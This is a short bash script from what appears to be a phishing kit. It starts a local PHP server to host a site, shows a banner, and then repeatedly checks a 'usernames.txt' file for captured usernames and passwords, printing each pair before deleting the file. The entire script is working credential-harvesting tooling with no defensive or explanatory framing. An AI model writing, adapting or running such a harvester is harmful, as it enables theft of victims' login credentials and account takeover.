#!/bin/bash

HOST='127.0.0.1'
PORT='8080'
banner() {
	cat <<- EOF
		▄▄▄· ▪  ▄▄▄▄▄▄▄▄▄· 
		▐█ ▀█▪██ •██  ▐█ ▀█▪
		▐█▀▀█▄▐█· ▐█.▪▐█▀▀█▄
		██▄▪▐█▐█▌ ▐█▌·██▄▪▐█
		·▀▀▀▀ ▀▀▀ ▀▀▀ ·▀▀▀▀ 
	EOF
}
setup_site() {
	echo -ne "\nStarting PHP server..."
	cd www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' www/site/userpass/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' www/site/userpass/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n -> Account : $ACCOUNT"
	echo -e "\n -> Password : $PASSWORD"
	echo -ne "\nWaiting for Next Login Info, Ctrl + C to exit. "
}

capture_data() {
	echo -ne "\nWaiting for Login Info, Ctrl + C to exit..."
	while true; do
		if [[ -e "www/site/userpass/usernames.txt" ]]; then
			echo -e "\n\n# Login info Found !!"
			capture_creds
			rm -rf www/site/userpass/usernames.txt
		fi
		sleep 0.75
	done
}

start_localhost() {
	echo -e "\nInitializing..."
	setup_site
	{ sleep 1; clear; banner;}
	echo -e "\nSuccessfully Hosted at : http://$HOST:$PORT"
	capture_data
}

start_localhost